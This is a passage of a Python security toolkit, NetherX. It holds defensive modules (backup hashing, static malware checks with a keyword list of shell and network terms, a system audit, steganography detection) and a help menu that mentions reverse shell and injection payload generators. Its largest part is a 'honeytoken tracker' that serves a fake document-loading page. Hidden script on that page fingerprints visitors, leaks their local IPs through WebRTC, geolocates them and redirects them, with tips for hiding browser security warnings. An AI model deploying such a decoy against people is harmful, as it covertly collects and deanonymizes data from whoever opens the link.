        prompt = f"Assess email security for '{domain}' based on SPF/DKIM/DMARC results. Explain spoofing risks and remediation."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI email assessment failed: {e}')


# ==========================================
# 49. DDOS RESILIENCE ADVISOR
# ==========================================

def ddos_resilience_advisor():
    print_info('DDoS Resilience Advisor')
    infra = get_input(f"{BOLD}Describe your infrastructure (web server, CDN, bandwidth): {RESET}")
    print_section('DDOS HARDENING ADVICE')
    try:
        prompt = f"Provide DDoS resilience recommendations for this infrastructure: {infra or 'General web application'}. Include rate limiting, CDN usage, WAF rules, and upstream filtering."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI DDoS advice failed: {e}')


# ==========================================
# 50. BACKUP INTEGRITY VERIFIER
# ==========================================

def backup_integrity_verifier():
    print_info('Backup Integrity Verifier')
    path = get_input(f"{BOLD}Enter backup file or directory path: {RESET}")
    if not path or not os.path.exists(path):
        print_error('Path not found.')
        return
    try:
        if os.path.isfile(path):
            with open(path, 'rb') as f:
                h = hashlib.sha256(f.read()).hexdigest()
            print_section('BACKUP INTEGRITY')
            print(f' File: {path}')
            print(f' SHA-256: {h}')
            print(f' Size: {os.path.getsize(path)} bytes')
            print_success('Backup hash computed successfully.')
        else:
            hashes = {}
            for root, _, files in os.walk(path):
                for fname in files:
                    fp = os.path.join(root, fname)
                    try:
                        with open(fp, 'rb') as f:
                            hashes[fp] = hashlib.sha256(f.read()).hexdigest()
                    except Exception:
                        continue
            print_section('BACKUP INTEGRITY')
            print(f' Files hashed: {len(hashes)}')
            out = '/tmp/backup_hashes.json'
            with open(out, 'w') as f:
                json.dump(hashes, f, indent=2)
            print_success(f'Hash manifest saved to {out}')
    except Exception as e:
        print_error(f'Integrity check failed: {e}')


# ==========================================
# 51. RANSOMWARE READINESS CHECK
# ==========================================

def ransomware_readiness_check():
    print_info('Ransomware Readiness Check')
    print_section('READINESS ASSESSMENT')
    checks = [
        ('Offline backups exist and tested', False),
        ('Network segmentation implemented', False),
        ('Email filtering enabled', False),
        ('Endpoint protection deployed', False),
        ('RDP not exposed to internet', False),
        ('Patch management active', False),
        ('Incident response plan documented', False),
        ('User awareness training completed', False),
    ]
    for i, (check, _) in enumerate(checks, 1):
        print(f'   [{i}] [ ] {check}')
    try:
        prompt = "Provide a comprehensive ransomware readiness checklist for an organization. Include technical controls, backup strategies, and incident response steps."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI readiness check failed: {e}')


# ==========================================
# 52. MALWARE SANDBOX SIMULATOR
# ==========================================

def malware_sandbox_simulator(sandbox):
    print_info('Malware Sandbox Simulator')
    print('This module analyzes suspicious files in an isolated environment.')
    path = get_input(f"{BOLD}Enter suspicious file path to analyze: {RESET}")
    if not path or not os.path.exists(path):
        print_error('File not found.')
        return
    if sandbox:
        try:
            abs_path = os.path.abspath(path)
            sandbox.fs.upload_file(abs_path, '/tmp/suspicious_file')
            script = r"""
import os, hashlib, subprocess, json

file_path = '/tmp/suspicious_file'
print('--- STATIC ANALYSIS ---')
try:
    with open(file_path, 'rb') as f:
        data = f.read()
    print('File size: ' + str(len(data)) + ' bytes')
    print('MD5:     ' + hashlib.md5(data).hexdigest())
    print('SHA-1:   ' + hashlib.sha1(data).hexdigest())
    print('SHA-256: ' + hashlib.sha256(data).hexdigest())
    # Check file type
    try:
        result = subprocess.run(['file', file_path], capture_output=True, text=True, timeout=10)
        print('Type:    ' + result.stdout.strip())
    except Exception:
        pass
    # Check for suspicious strings
    strings = []
    for s in data.split(b'\x00'):
        if len(s) >= 8 and all(32 <= b <= 126 for b in s):
            decoded = s.decode('ascii', errors='ignore')
            if any(k in decoded.lower() for k in ['http', 'https', 'cmd.exe', 'powershell', 'base64', 'eval', 'exec', 'socket']):
                strings.append(decoded[:80])
    if strings:
        print('\n[!] Suspicious strings found:')
        for s in strings[:10]:
            print('   ' + s)
    else:
        print('\n[OK] No obviously suspicious strings.')
except Exception as e:
    print('[!] Analysis failed: ' + str(e))
"""
            output = run_remote_python(sandbox, script)
            print(f"\n{YELLOW}{output}{RESET}")
        except Exception as e:
            print_error(f'Sandbox analysis failed: {e}')
    else:
        print_error('Sandbox required for malware simulation.')
        # Local fallback
        try:
            with open(path, 'rb') as f:
                data = f.read()
            print_section('LOCAL STATIC ANALYSIS')
            print(f' Size: {len(data)} bytes')
            print(f' MD5:  {hashlib.md5(data).hexdigest()}')
            print(f' SHA1: {hashlib.sha1(data).hexdigest()}')
            print(f' SHA256: {hashlib.sha256(data).hexdigest()}')
        except Exception as e:
            print_error(f'Local analysis failed: {e}')


# ==========================================
# 53. FULL SYSTEM HEALTH AUDIT
# ==========================================

def full_system_health_audit(sandbox):
    print_info('Full System Health Audit')
    print('Running comprehensive system checks...')
    output = ''
    if sandbox:
        try:
            script = r"""
import subprocess, os, json

findings = []
print('--- SYSTEM HEALTH AUDIT ---')

# Disk usage
try:
    result = subprocess.run(['df', '-h'], capture_output=True, text=True, timeout=5)
    print('\n[+] Disk Usage:')
    for line in result.stdout.splitlines()[:6]:
        print('   ' + line)
except Exception: pass

# Memory usage
try:
    result = subprocess.run(['free', '-h'], capture_output=True, text=True, timeout=5)
    print('\n[+] Memory:')
    for line in result.stdout.splitlines():
        print('   ' + line)
except Exception: pass

# Load average
try:
    with open('/proc/loadavg', 'r') as f:
        load = f.read().strip()
    print('\n[+] Load Average: ' + load)
except Exception: pass

# Listening ports
try:
    result = subprocess.run(['ss', '-tlnp'], capture_output=True, text=True, timeout=5)
    ports = [line for line in result.stdout.splitlines() if 'LISTEN' in line]
    print(f'\n[+] Listening Ports: {len(ports)}')
    for line in ports[:10]:
        print('   ' + line)
except Exception: pass

# Users
try:
    with open('/etc/passwd', 'r') as f:
        users = [line.split(':')[0] for line in f if int(line.split(':')[2]) >= 1000]
    print(f'\n[+] Regular users: {len(users)}')
except Exception: pass

# SUID binaries
try:
    result = subprocess.run(['find', '/usr/bin', '/usr/sbin', '-perm', '-4000', '-type', 'f'], capture_output=True, text=True, timeout=15)
    suid = [line for line in result.stdout.splitlines() if line]
    print(f'\n[+] SUID binaries: {len(suid)}')
    for line in suid[:10]:
        print('   ' + line)
except Exception: pass

# World-writable files
try:
    result = subprocess.run(['find', '/tmp', '-type', 'f', '-perm', '-002'], capture_output=True, text=True, timeout=10)
    ww = [line for line in result.stdout.splitlines() if line]
    if ww:
        print(f'\n[!] World-writable files in /tmp: {len(ww)}')
except Exception: pass

print('\n[+] Audit complete.')
"""
            output = run_remote_python(sandbox, script)
            print(f"\n{YELLOW}{output}{RESET}")
        except Exception as e:
            print_error(f'System health audit failed: {e}')
    else:
        print_error('Sandbox required for full system audit.')
    try:
        prompt = "Analyze this system health data and provide prioritized hardening recommendations."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI health audit failed: {e}')


# ==========================================
# 54. STEGANOGRAPHY ANALYZER
# ==========================================

def steganography_analyzer():
    print_info('Steganography Analyzer')
    path = get_input(f"{BOLD}Enter image or file path to analyze: {RESET}")
    if not path or not os.path.exists(path):
        print_error('File not found.')
        return
    try:
        with open(path, 'rb') as f:
            data = f.read()
        print_section('STEGANOGRAPHY ANALYSIS')
        print(f' File size: {len(data)} bytes')
        # Check for common stego signatures
        signatures = {
            b'steg': 'Possible steganography tool signature',
            b'PK\x03\x04': 'ZIP archive embedded (possible stego)',
            b'Rar!': 'RAR archive embedded',
        }
        for sig, desc in signatures.items():
            if sig in data:
                print_warn(f'{desc} detected')
        # Extract trailing data after common image markers
        eoi_jpeg = data.rfind(b'\xff\xd9')
        eoi_png = data.rfind(b'IEND\xaeB`\x82')
        if eoi_jpeg > 0 and eoi_jpeg < len(data) - 10:
            trailing = data[eoi_jpeg + 2:]
            if trailing:
                print_warn(f'{len(trailing)} bytes of trailing data after JPEG EOF')
        if eoi_png > 0 and eoi_png < len(data) - 12:
            trailing = data[eoi_png + 8:]
            if trailing:
                print_warn(f'{len(trailing)} bytes of trailing data after PNG IEND')
        # Check entropy
        if len(data) > 0:
            entropy = -sum((data.count(bytes([b])) / len(data)) * math.log2(data.count(bytes([b])) / len(data)) for b in range(256) if data.count(bytes([b])) > 0)
            print(f' Entropy: {entropy:.2f} (8.0 = random/encrypted, <7.5 = likely structured)')
        print_success('Steganography analysis complete.')
    except Exception as e:
        print_error(f'Steganalysis failed: {e}')
    try:
        prompt = "Explain common steganography techniques and how to detect hidden data in images, audio, and documents."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI steganalysis failed: {e}')


# ==========================================
# HELP / MANUAL
# ==========================================

def print_general_help():
    print(f"\n{YELLOW}{BOLD}======================= USER MANUAL & HELP ======================={RESET}")
    print(f"{BOLD}{BLUE}Core Modules{RESET}")
    print(f"{BOLD}1. AI & Static Audit:{RESET} Upload a Python file for static analysis + AI review.")
    print(f"{BOLD}2. AI Phishing Detector:{RESET} Analyze URLs for phishing and social engineering risks.")
    print(f"{BOLD}3. Network Scan:{RESET} Nmap port scan via cloud sandbox with AI hardening advice.")
    print(f"{BOLD}4. Web Headers:{RESET} Inspect HTTP security headers.")
    print(f"{BOLD}5. DNS & WHOIS Recon:{RESET} Resolve domains and retrieve registrar data.")
    print(f"{BOLD}6. AI CVE & Exploit Search:{RESET} Search CVEs by software name and version.")
    print(f"{BOLD}7. Subdomain Enumeration:{RESET} Query certificate transparency logs (crt.sh).")
    print(f"{BOLD}8. SSL/TLS Cert Inspector:{RESET} Analyze certificates for expiry and weaknesses.")

    print(f"\n{BOLD}{BLUE}Web Application Security{RESET}")
    print(f"{BOLD}9. Exposed File Scanner:{RESET} Probe for sensitive files (.git, .env, backups).")
    print(f"{BOLD}10. Deep Header Analysis:{RESET} Weighted security header scorecard with grades.")
    print(f"{BOLD}11. Directory Brute Forcer:{RESET} Discover hidden directories and panels.")
    print(f"{BOLD}12. API Endpoint Fuzzer:{RESET} Discover and test API endpoints.")
    print(f"{BOLD}13. SQLi / XSS Payload Gen:{RESET} Generate authorized test payloads.")
    print(f"{BOLD}14. JWT Token Analyzer:{RESET} Decode and analyze JWT tokens for security flaws.")
    print(f"{BOLD}15. Secret Scanner:{RESET} Deep scan code for API keys, tokens, and passwords.")
    print(f"{BOLD}16. API Security Scanner:{RESET} Check CORS, error handling, and rate limiting.")

    print(f"\n{BOLD}{BLUE}Network & Infrastructure{RESET}")
    print(f"{BOLD}17. Port Vuln Matcher:{RESET} Nmap + AI CVE correlation for open services.")
    print(f"{BOLD}18. WHOIS + IP Geo-Location:{RESET} Registrar data + IP geolocation.")
    print(f"{BOLD}19. WiFi Auditor:{RESET} Analyze WiFi security configurations.")
    print(f"{BOLD}20. Firewall Analyzer:{RESET} Analyze firewall rules for gaps.")
    print(f"{BOLD}21. Traffic Analyzer:{RESET} Analyze network connections for anomalies.")
    print(f"{BOLD}22. PCAP Analyzer:{RESET} Analyze packet capture summaries.")
    print(f"{BOLD}23. ARP Spoofing Detector:{RESET} Detect duplicate MACs and MITM indicators.")
    print(f"{BOLD}24. DNS Tunneling Detector:{RESET} Identify DNS tunneling patterns.")

    print(f"\n{BOLD}{BLUE}System Forensics{RESET}")
    print(f"{BOLD}25. Password / Hash Analyzer:{RESET} Entropy calculation and hash identification.")
    print(f"{BOLD}26. Log File Analyzer:{RESET} Parse auth/access logs for attack patterns.")
    print(f"{BOLD}27. Registry Forensics:{RESET} Windows registry persistence analysis.")
    print(f"{BOLD}28. Memory Dump Analyzer:{RESET} Extract strings and indicators from dumps.")
    print(f"{BOLD}29. Process Anomaly Detector:{RESET} Find suspicious running processes.")
    print(f"{BOLD}30. File Integrity Monitor:{RESET} Compute and verify file hashes.")
    print(f"{BOLD}31. Keylogger Detector:{RESET} Identify keylogger indicators.")
    print(f"{BOLD}32. Rootkit Scanner:{RESET} Detect hidden processes and kernel modules.")

    print(f"\n{BOLD}{BLUE}Cloud & DevSecOps{RESET}")
    print(f"{BOLD}33. Dependency Auditor:{RESET} Check requirements.txt against OSV.dev.")
    print(f"{BOLD}34. Container Security Scan:{RESET} Docker security assessment.")
    print(f"{BOLD}35. Cloud Misconfig Scanner:{RESET} AWS/Azure/GCP misconfiguration guidance.")
    print(f"{BOLD}36. S3 Bucket Scanner:{RESET} Check S3 bucket permissions and listings.")
    print(f"{BOLD}37. Database Security Scan:{RESET} Database hardening checklist.")
    print(f"{BOLD}38. SBOM Generator:{RESET} Generate Software Bill of Materials.")
    print(f"{BOLD}39. Compliance Checker:{RESET} NIST CSF, CIS, ISO 27001, PCI-DSS checklists.")
    print(f"{BOLD}40. Supply Chain Risk Auditor:{RESET} Analyze dependency supply chain risks.")

    print(f"\n{BOLD}{BLUE}Threat Intelligence{RESET}")
    print(f"{BOLD}41. Incident Response:{RESET} AI-powered incident triage from logs.")
    print(f"{BOLD}42. Threat Intel Feed:{RESET} Latest threat landscape summary.")
    print(f"{BOLD}43. IOC Scanner:{RESET} Check IPs, domains, hashes against threat intel.")
    print(f"{BOLD}44. YARA Rule Generator:{RESET} Generate YARA detection rules.")
    print(f"{BOLD}45. Dark Web Monitor:{RESET} Simulated dark web exposure intelligence.")
    print(f"{BOLD}46. SE Toolkit:{RESET} Social engineering awareness training scenarios.")
    print(f"{BOLD}47. Reverse Shell Generator:{RESET} Generate payloads for authorized testing.")
    print(f"{BOLD}48. Email Security Auditor:{RESET} SPF, DKIM, DMARC record verification.")

    print(f"\n{BOLD}{BLUE}Advanced Operations{RESET}")
    print(f"{BOLD}49. DDoS Resilience Advisor:{RESET} Hardening against DDoS attacks.")
    print(f"{BOLD}50. Backup Integrity Verifier:{RESET} Hash verification for backups.")
    print(f"{BOLD}51. Ransomware Readiness:{RESET} Comprehensive ransomware preparedness check.")
    print(f"{BOLD}52. Malware Sandbox:{RESET} Static analysis of suspicious files in isolation.")
    print(f"{BOLD}53. System Health Audit:{RESET} Full system security posture assessment.")
    print(f"{BOLD}54. Steganography Analyzer:{RESET} Detect hidden data in files and images.")

    print(f"\n{BOLD}{BLUE}Credits{RESET}")
    print(f"{BOLD}58. Developer Info:{RESET} Project creator, Discord ID and community links.")
    print(f"\n{BOLD}{BLUE}Live Threat Intelligence APIs{RESET}")
    print(f"{BOLD}59. VirusTotal Lookup:{RESET} Hash/IP/domain/URL reputation from 70+ engines (free API key).")
    print(f"{BOLD}60. Deep IP Intel:{RESET} Advanced IP lookup with ASN, Proxy/VPN detection (100% Free, no key).")
    print(f"{BOLD}61. AbuseIPDB Check:{RESET} IP abuse confidence score & reports (free API key).")
    print(f"{BOLD}62. NVD CVE Lookup:{RESET} REAL CVE data + CVSS scores from NIST (no key needed).")
    print(f"{BOLD}63. HIBP Pass Check:{RESET} Checks if a password appeared in known breaches (private).")
    print(f"\n{BOLD}{BLUE}Bug Bounty & Pentest Power{RESET}")
    print(f"{BOLD}64. Subdomain TKO:{RESET} Detects dangling CNAMEs for subdomain takeover bugs.")
    print(f"{BOLD}65. WAF Detector:{RESET} Identifies Cloudflare/Akamai/Sucuri + payload blocking.")
    print(f"{BOLD}66. WP/CMS Scanner:{RESET} WordPress version, plugins, xmlrpc & readme exposure.")
    print(f"{BOLD}67. Recon Pipeline:{RESET} One-command recon: subdomains -> live hosts -> takeover + AI.")
    print(f"{BOLD}68. Nuclei Scan:{RESET} Runs Nuclei (1000+ vuln templates) in cloud sandbox.")
    print(f"\n{BOLD}{BLUE}Pro Workflow & Reporting{RESET}")
    print(f"{BOLD}69. CVSS Calculator:{RESET} Computes CVSS 3.1 base score & severity from vector.")
    print(f"{BOLD}70. Pentest Report:{RESET} Professional HTML report from session findings + notes.")
    print(f"{BOLD}71. Local AI Ollama:{RESET} Private offline AI analysis (no data leaves your PC).")
    print(f"\n{BOLD}{BLUE}Utility & Privacy{RESET}")
    print(f"{BOLD}72. Encode/Decode Kit:{RESET} Base64, Hex, URL, ROT13, Binary & XOR tools (100% local).")
    print(f"{BOLD}73. Update Checker:{RESET} Checks GitHub for the latest NetherX version (real update detection).")

    print(f"\n{CYAN}{BOLD}--- WHAT CAN YOU DO WITH A TARGET'S IP? ---{RESET}")
    print(f"{BOLD}Server Identification:{RESET} Identify server software and stack.")
    print(f"{BOLD}Geo-Location:{RESET} Find physical hosting location.")
    print(f"{BOLD}Firewall/CDN Detection:{RESET} Detect Cloudflare or reverse proxies.")
    print(f"{BOLD}Port & Service Discovery:{RESET} Find exposed databases and admin panels.")
    print(f"{BOLD}Attack Surface Mapping:{RESET} Combine subdomains + ports + exposed files.")
    print(f"\n{YELLOW}Reminder: Only scan, enumerate, or test assets you own or are authorized to assess.{RESET}")



# ==========================================
# 57. HONEYTOKEN THREAT TRACKER v3.0
# ==========================================

TRACKER_LOG_FILE = os.path.join(os.path.expanduser("~"), ".netherx_tracker_logs.json")
TRACKER_CONFIG = os.path.join(os.path.expanduser("~"), ".netherx_tracker_config.json")

def _tracker_load_config():
    if os.path.exists(TRACKER_CONFIG):
        try:
            with open(TRACKER_CONFIG, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def _tracker_save_config(cfg):
    with open(TRACKER_CONFIG, 'w') as f:
        json.dump(cfg, f, indent=2)

def _tracker_load_logs():
    if os.path.exists(TRACKER_LOG_FILE):
        try:
            with open(TRACKER_LOG_FILE, 'r') as f:
                return json.load(f)
        except:
            return []
    return []

def _tracker_save_log(entry):
    logs = _tracker_load_logs()
    logs.append(entry)
    with open(TRACKER_LOG_FILE, 'w') as f:
        json.dump(logs, f, indent=2)

def _tracker_get_ip_info(ip):
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
        req = urllib.request.Request(url, headers={'User-Agent': 'NetherX-Tracker/1.0'})
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode())
        if data.get('status') == 'success':
            return data
    except:
        pass
    return None

def _tracker_get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def _tracker_banner():
    print()
    print(CYAN + "+" + "-"*76 + "+" + RESET)
    print(CYAN + "|" + RESET + BOLD + CYAN + "          NETHERX HONEYTOKEN & THREAT TRACKER v3.0" + RESET + " "*28 + CYAN + "|" + RESET)
    print(CYAN + "|" + RESET + GRAY + "     Maximum Intelligence Gathering - Defensive Incident Response" + RESET + " "*13 + CYAN + "|" + RESET)
    print(CYAN + "+" + "-"*76 + "+" + RESET)
    print()
    print(RED + BOLD + "ETHICAL USE ONLY - Track threats against YOUR infrastructure only." + RESET)
    print()

# The decoy HTML page - built as a list to avoid quote issues
_TRACKER_HTML_PARTS = [
    '<!DOCTYPE html>',
    '<html lang="en">',
    '<head>',
    '<meta charset="UTF-8">',
    '<meta name="viewport" content="width=device-width, initial-scale=1.0">',
    '<title>Secure Document Portal</title>',
    '<style>',
    '*{margin:0;padding:0;box-sizing:border-box}',
    'body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center}',
    '.card{background:rgba(255,255,255,0.95);padding:40px 50px;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center;max-width:400px;width:90%}',
    '.spinner{width:50px;height:50px;border:4px solid #e0e0e0;border-top-color:#667eea;border-radius:50%;margin:0 auto 20px;animation:spin 1s linear infinite}',
    '@keyframes spin{to{transform:rotate(360deg)}}',
    'h1{color:#333;font-size:22px;margin-bottom:8px}',
    'p{color:#666;font-size:14px;margin-bottom:4px}',
    '.progress-bar{width:100%;height:4px;background:#e0e0e0;border-radius:2px;margin-top:20px;overflow:hidden}',
    '.progress{height:100%;background:#667eea;width:0%;animation:load 1.5s ease-out forwards}',
    '@keyframes load{to{width:100%}}',
    '.footer{margin-top:20px;font-size:11px;color:#999}',
    '</style>',
    '</head>',
    '<body>',
    '<div class="card">',
    '<div class="spinner"></div>',
    '<h1>Loading Document</h1>',
    '<p>Please wait while we verify your access...</p>',
    '<div class="progress-bar"><div class="progress"></div></div>',
    '<p class="footer">Secured by DocumentVault &copy; 2026</p>',
    '</div>',
    '<script>',
    '(function(){',
    'var d={t:new Date().toISOString(),ua:navigator.userAgent,p:navigator.platform,v:navigator.vendor||"",lang:navigator.language,langs:(navigator.languages||[]).join(","),cookie:navigator.cookieEnabled,online:navigator.onLine,dnt:navigator.doNotTrack,touch:"ontouchstart"in window,webdriver:navigator.webdriver||false,cores:navigator.hardwareConcurrency||0,ram:navigator.deviceMemory||0,screen:{w:screen.width,h:screen.height,aw:screen.availWidth,ah:screen.availHeight,d:screen.colorDepth},vp:{w:window.innerWidth,h:window.innerHeight,dpr:window.devicePixelRatio||1},ref:document.referrer,url:location.href,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,tzOff:new Date().getTimezoneOffset()};',
    'try{var c=document.createElement("canvas").getContext("2d");c.textBaseline="top";c.font="14px Arial";c.fillText("NXv3 "+new Date,2,2);d.canvas=c.canvas.toDataURL().slice(-20);}catch(e){}',
    'try{var g=document.createElement("canvas").getContext("webgl")||document.createElement("canvas").getContext("experimental-webgl");if(g){var x=g.getExtension("WEBGL_debug_renderer_info");d.gpu={v:g.getParameter(x?x.UNMASKED_VENDOR_WEBGL:g.VENDOR),r:g.getParameter(x?x.UNMASKED_RENDERER_WEBGL:g.RENDERER)};}}catch(e){}',
    'try{var rtcIps=[];var pc=new RTCPeerConnection({iceServers:[]});pc.createDataChannel("");pc.createOffer().then(function(o){pc.setLocalDescription(o);});setTimeout(function(){var sdp=pc.localDescription?pc.localDescription.sdp:"";var m=sdp.match(/([0-9]+[.][0-9]+[.][0-9]+[.][0-9]+)/g);if(m){m.forEach(function(ip){if(rtcIps.indexOf(ip)===-1)rtcIps.push(ip);});}if(rtcIps.length)d.rtc=rtcIps;_send();},800);}catch(e){d.rtcErr=e.message;_send();}',
    'function _send(){var payload=JSON.stringify(d);if(navigator.sendBeacon){navigator.sendBeacon("/collect",payload);}else{fetch("/collect",{method:"POST",headers:{"Content-Type":"application/json"},body:payload,keepalive:true}).catch(function(){});}setTimeout(function(){window.location.href=__REDIRECT__;},1200);}',
    '})();',
    '</script>',
    '</body>',
    '</html>'
]

def _build_tracker_html(redirect_url):
    html = "\n".join(_TRACKER_HTML_PARTS)
    return html.replace("__REDIRECT__", json.dumps(redirect_url))

class TrackerHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def _get_client_ip(self):
        xff = self.headers.get('X-Forwarded-For', '')
        if xff:
            return xff.split(',')[0].strip()
        return self.client_address[0]

    def _send_html(self, html):
        try:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate')
            self.send_header('Pragma', 'no-cache')
            self.send_header('Expires', '0')
            self.end_headers()
            self.wfile.write(html.encode('utf-8'))
        except (ConnectionAbortedError, BrokenPipeError, OSError):
            pass

    def _send_pixel(self):
        try:
            self.send_response(200)
            self.send_header('Content-Type', 'image/gif')
            self.send_header('Cache-Control', 'no-store')
            self.end_headers()
            self.wfile.write(bytes.fromhex('47494638396101000100800000000000ffffff21f90401000000002c000000000100010000020144003b'))
        except (ConnectionAbortedError, BrokenPipeError, OSError):
            pass

    def do_GET(self):
        client_ip = self._get_client_ip()
        path = self.path
        cfg = _tracker_load_config()
        redirect_url = cfg.get('redirect_url', 'https://www.google.com')

        entry = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'ip': client_ip,
            'method': self.command,
            'path': path,
            'user_agent': self.headers.get('User-Agent', ''),
            'referer': self.headers.get('Referer', ''),
            'accept_language': self.headers.get('Accept-Language', ''),
            'accept': self.headers.get('Accept', ''),
            'host': self.headers.get('Host', ''),
            'all_headers': {k: v for k, v in self.headers.items()},
            'stage': 'initial_hit'
        }
        geo = _tracker_get_ip_info(client_ip)
        if geo:
            entry['geo'] = geo
        _tracker_save_log(entry)

        if not path.endswith(('.gif', '.png', '.jpg', 'pixel', 'ico')):
            print()
            print(CYAN + "[+] VISITOR HIT" + RESET + " " + YELLOW + client_ip + RESET + " " + GRAY + "|" + RESET + " " + GRAY + entry.get('user_agent','')[:55] + RESET)
            if geo:
                print("    " + MAGENTA + "Location:" + RESET + " " + geo.get('city','?') + ", " + geo.get('country','?') + " | " + geo.get('isp','?'))
            print("    " + GRAY + "Collecting browser fingerprint..." + RESET)

        if path.endswith(('.gif', '.png', '.jpg', 'pixel')):
            self._send_pixel()
        elif path == '/collect':
            try:
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"ok":true}')
            except (ConnectionAbortedError, BrokenPipeError, OSError):
                pass
        else:
            html = _build_tracker_html(redirect_url)
            self._send_html(html)

    def do_POST(self):
        client_ip = self._get_client_ip()
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')

        entry = {
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'ip': client_ip,
            'method': self.command,
            'path': self.path,
            'user_agent': self.headers.get('User-Agent', ''),
            'stage': 'full_fingerprint',
            'all_headers': {k: v for k, v in self.headers.items()}
        }

        try:
            browser_data = json.loads(post_data)
            entry['browserData'] = browser_data
        except:
            entry['rawPost'] = post_data

        geo = _tracker_get_ip_info(client_ip)
        if geo:
            entry['geo'] = geo

        _tracker_save_log(entry)
        _tracker_print_capture(entry)

        try:
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'{"status":"captured"}')
        except (ConnectionAbortedError, BrokenPipeError, OSError):
            pass

    def do_OPTIONS(self):
        try:
            self.send_response(200)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
            self.send_header('Access-Control-Allow-Headers', 'Content-Type')
            self.end_headers()
        except (ConnectionAbortedError, BrokenPipeError, OSError):
            pass

def _tracker_print_capture(entry):
    print()
    print(RED + BOLD + "="*70 + RESET)
    print(RED + BOLD + "  THREAT CAPTURED!" + RESET + "  " + CYAN + entry['timestamp'] + RESET)
    print(RED + BOLD + "="*70 + RESET)
    print("  " + BOLD + "IP:" + RESET + " " + YELLOW + entry['ip'] + RESET)
    print("  " + BOLD + "UA:" + RESET + " " + GRAY + entry.get('user_agent','')[:80] + RESET)

    geo = entry.get('geo')
    if geo:
        print()
        print("  " + BOLD + MAGENTA + "GEO:" + RESET)
        print("    " + geo.get('city','?') + ", " + geo.get('country','?') + " (" + geo.get('countryCode','') + ")")
        print("    ISP: " + geo.get('isp','?') + " | Org: " + geo.get('org','?'))
        print("    ASN: " + geo.get('as','?'))
        print("    Coords: " + str(geo.get('lat','?')) + ", " + str(geo.get('lon','?')))
        vpn = 'YES' if geo.get('proxy') or geo.get('hosting') else 'No'
        vpn_color = RED if geo.get('proxy') or geo.get('hosting') else GREEN
        print("    VPN/Proxy: " + vpn_color + vpn + RESET)

    bd = entry.get('browserData')
    if bd:
        print()
        print("  " + BOLD + CYAN + "DEVICE:" + RESET)
        print("    Platform: " + bd.get('p','?') + " | Vendor: " + bd.get('v','?'))
        scr = bd.get('screen', {})
        print("    Screen: " + str(scr.get('w','?')) + "x" + str(scr.get('h','?')))
        vp = bd.get('vp', {})
        print("    Viewport: " + str(vp.get('w','?')) + "x" + str(vp.get('h','?')))
        print("    CPU: " + str(bd.get('cores','?')) + " cores | RAM: " + str(bd.get('ram','?')) + "GB | Touch: " + ('Yes' if bd.get('touch') else 'No'))
        print("    WebDriver: " + ('YES (BOT!)' if bd.get('webdriver') else 'No') + " | Online: " + ('Yes' if bd.get('online') else 'No'))
        if bd.get('gpu'):
            print("    GPU: " + bd['gpu'].get('r','?'))
        if bd.get('rtc'):
            print("    " + RED + "Local IPs (WebRTC leak):" + RESET + " " + ", ".join(bd['rtc']))
        if bd.get('canvas'):
            print("    Canvas FP: " + bd['canvas'][:30] + "...")

    print()
    print("  " + GREEN + "[+] Saved to: " + TRACKER_LOG_FILE + RESET)
    print(RED + BOLD + "="*70 + RESET)
    print()

def _tracker_generate_links():
    cfg = _tracker_load_config()
    _tracker_banner()
    print(YELLOW + "How will you deploy this link?" + RESET)
    print("  " + CYAN + "1" + RESET + ". Local Network (same WiFi/LAN)")
    print("  " + CYAN + "2" + RESET + ". Ngrok tunnel (free HTTPS - REMOVES 'Not Secure'!)")
    print("  " + CYAN + "3" + RESET + ". Cloud VPS (Render/Railway/etc)")
    print("  " + CYAN + "4" + RESET + ". Custom domain/URL")
    choice = input("\n" + BOLD + "Select (1-4): " + RESET).strip()

    base_url = ""
    if choice == '1':
        ip = _tracker_get_local_ip()
        port = input(BOLD + "Port (default 8080): " + RESET).strip() or "8080"
        base_url = "http://" + ip + ":" + port
        print()
        print(YELLOW + "[!] NOTE: This will show 'Not Secure' in browser." + RESET)
        print(YELLOW + "    Use Option 2 (Ngrok) for HTTPS and no warning." + RESET)
    elif choice == '2':
        print()
        print(CYAN + "=== NGROK SETUP (FREE HTTPS) ===" + RESET)
        print("  1. Download: " + CYAN + "https://ngrok.com/download" + RESET)
        print("  2. Extract ngrok.exe aur is folder mein rakho")
        print("  3. New terminal kholke chalao: " + CYAN + "ngrok http 8080" + RESET)
        print("  4. Jo " + GREEN + "Forwarding" + RESET + " URL mile (https://...), woh paste karo")
        print()
        print(GREEN + "Yeh URL 'Not Secure' warning nahi dega!" + RESET)
        ngrok = input("\n" + BOLD + "Paste ngrok HTTPS URL: " + RESET).strip()
        base_url = ngrok.rstrip('/')
    elif choice == '3':
